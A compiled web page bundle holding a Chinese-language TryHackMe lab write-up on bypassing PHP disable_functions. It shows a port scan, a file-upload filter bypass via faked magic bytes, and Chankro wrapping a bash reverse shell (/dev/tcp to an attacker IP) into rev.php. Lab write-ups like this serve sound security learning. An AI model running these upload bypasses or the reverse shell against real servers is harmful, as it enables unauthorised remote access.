"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[8116],{93619:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>o,contentTitle:()=>r,default:()=>u,frontMatter:()=>a,metadata:()=>c,toc:()=>l});var i=s(74848),t=s(28453);const a={sidebar_position:2,tags:["Easy","Linux","\u6587\u4ef6\u4e0a\u4f20"],title:"Bypass Disable Functions",description:"\u5728 PHP \u6587\u4ef6\u4e0a\u4f20\u65f6\u9047\u5230\u51fd\u6570\u9650\u5236\u5982\u4f55\u7ed5\u8fc7",sidebar_label:"Bypass Disable Functions"},r="Bypass Disable Functions",c={id:"box/TryHackMe/2",title:"Bypass Disable Functions",description:"\u5728 PHP \u6587\u4ef6\u4e0a\u4f20\u65f6\u9047\u5230\u51fd\u6570\u9650\u5236\u5982\u4f55\u7ed5\u8fc7",source:"@site/docs/box/TryHackMe/2.md",sourceDirName:"box/TryHackMe",slug:"/box/TryHackMe/2",permalink:"/docs/box/TryHackMe/2",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u6587\u4ef6\u4e0a\u4f20",permalink:"/docs/tags/\u6587\u4ef6\u4e0a\u4f20"}],version:"current",sidebarPosition:2,frontMatter:{sidebar_position:2,tags:["Easy","Linux","\u6587\u4ef6\u4e0a\u4f20"],title:"Bypass Disable Functions",description:"\u5728 PHP \u6587\u4ef6\u4e0a\u4f20\u65f6\u9047\u5230\u51fd\u6570\u9650\u5236\u5982\u4f55\u7ed5\u8fc7",sidebar_label:"Bypass Disable Functions"},sidebar:"boxSidebar",previous:{title:"Blue",permalink:"/docs/box/TryHackMe/1"},next:{title:"Basic Pentesting",permalink:"/docs/box/TryHackMe/3"}},o={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2}];function p(n){const e={code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,t.R)(),...n.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.h1,{id:"bypass-disable-functions",children:"Bypass Disable Functions"}),"\n",(0,i.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-239-179:~# rustscan -a 10.10.12.68 -r 1-65535 -t 1000 -u 1000 -- -sT\n.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.\n| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |\n| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |\n`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'\nThe Modern Day Port Scanner.\n________________________________________\n: https://discord.gg/GFrQsGy           :\n: https://github.com/RustScan/RustScan :\n --------------------------------------\n\ud83d\ude35 https://admin.tryhackme.com\n\n[~] The config file is expected to be at \"/home/rustscan/.rustscan.toml\"\n[~] Automatically increasing ulimit value to 1000.\n[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers\n[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. \nOpen 10.10.12.68:22\nOpen 10.10.12.68:80\n"})}),"\n",(0,i.jsx)(e.h2,{id:"80",children:"80"}),"\n",(0,i.jsx)(e.p,{children:"\u7ecf\u8fc7\u7b80\u5355\u7684\u67e5\u8be2\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u7684\u4f4d\u7f6e\uff1a"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525004016.png",alt:"20240525004016"})}),"\n",(0,i.jsxs)(e.p,{children:["\u6211\u4eec\u6765\u4e0b\u8f7d\u4e00\u4e2a\u53cd\u5411 SHELL \u6587\u4ef6\uff0c \u4e0b\u8f7d\u5230\u672c\u5730\u540e\uff0c \u5f00\u542f\u6211\u4eec\u7684 Burp, \u8fdb\u884c\u62e6\u622a\u53d1\u5305\uff0c \u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u53ea\u80fd\u4e0a\u4f20 ",(0,i.jsx)(e.code,{children:".jpg"})," \u6587\u4ef6\uff0c \u6b64\u65f6\u6211\u4eec\u9700\u8981\u7ed5\u8fc7\u540e\u7aef\u8fc7\u6ee4, \u7ecf\u8fc7\u67e5\u8be2\u540e\u53d1\u73b0\u4fee\u6539\u6587\u4ef6\u5e7b\u6570\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u6d4b"]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525004030.png",alt:"20240525004030"})}),"\n",(0,i.jsx)(e.p,{children:"\u73b0\u5728\u6211\u4eec\u6765\u67e5\u627e\u4e00\u4e0b\u5bf9\u5e94\u7684\u4e0a\u4f20\u4f4d\u7f6e, \u53d1\u73b0\u6587\u4ef6\u4e0a\u4f20\u4f4d\u7f6e\uff0c \u6211\u4eec\u8fdb\u884c\u8bbf\u95ee"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525004044.png",alt:"20240525004044"})}),"\n",(0,i.jsx)(e.p,{children:"\u6211\u4eec\u6765\u8bbf\u95ee\u6211\u4eec\u7684\u6587\u4ef6\u53ef\u4ee5\u53d1\u73b0\u83b7\u53d6\u5230 SHELL  \u4f46\u662f\u9a6c\u4e0a\u5173\u95ed\uff0c \u6211\u4eec\u67e5\u770b\u623f\u95f4\uff0c \u4e86\u89e3\u5230\u9700\u8981\u505a\u4e00\u4e9b\u89c4\u907f"}),"\n",(0,i.jsxs)(e.p,{children:["\u9996\u5148\u6839\u636e\u63d0\u793a\u5185\u5bb9\uff0c \u6211\u4eec\u9700\u8981\u5148\u627e\u5230\u5bf9\u5e94\u670d\u52a1\u5668\u7684\u8def\u5f84\uff0c \u5728\u76ee\u5f55\u904d\u5386\u65f6\uff0c \u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u4e2a ",(0,i.jsx)(e.code,{children:"phpinfo()"})," \u5728\u6b64\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u5bf9\u4e8e\u670d\u52a1\u5668\u8def\u5f84"]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525004059.png",alt:"20240525004059"})}),"\n",(0,i.jsx)(e.p,{children:"\u7136\u540e\u6211\u4eec\u4e0b\u8f7d\u5bf9\u5e94\u7684\u6587\u4ef6\u4ee5\u53ca\u5bf9\u5e94\u7684 payload \u6765\u751f\u6210\u6211\u4eec\u7684 rev.php"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"$ cat rev.sh                                                                                   \ue0b2 \u2714 \n#!/bin/bash\n\n/bin/bash -i >& /dev/tcp/10.13.31.216/4444 0>&1\n$ python2 chankro.py --arch 64 --input rev.sh --output rev.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db\n\n\n     -=[ Chankro ]=-\n    -={ @TheXC3LL }=-\n\n\n[+] Binary file: rev.sh\n[+] Architecture: x64\n[+] Final PHP: rev.php\n\n\n[+] File created!\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6309\u7167\u524d\u9762\u7684\u601d\u8def\u518d\u6b21\u5c06\u6587\u4ef6\u4e0a\u4f20\u4e0a\u53bb\u4e4b\u540e\uff0c \u5728\u672c\u5730\u5f00\u542f\u76d1\u542c\u8fdb\u884c\u68c0\u6d4b"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240525004131.png",alt:"20240525004131"})})]})}function u(n={}){const{wrapper:e}={...(0,t.R)(),...n.components};return e?(0,i.jsx)(e,{...n,children:(0,i.jsx)(p,{...n})}):p(n)}},28453:(n,e,s)=>{s.d(e,{R:()=>r,x:()=>c});var i=s(96540);const t={},a=i.createContext(t);function r(n){const e=i.useContext(a);return i.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(t):n.components||t:r(n.components),i.createElement(a.Provider,{value:e},n.children)}}}]);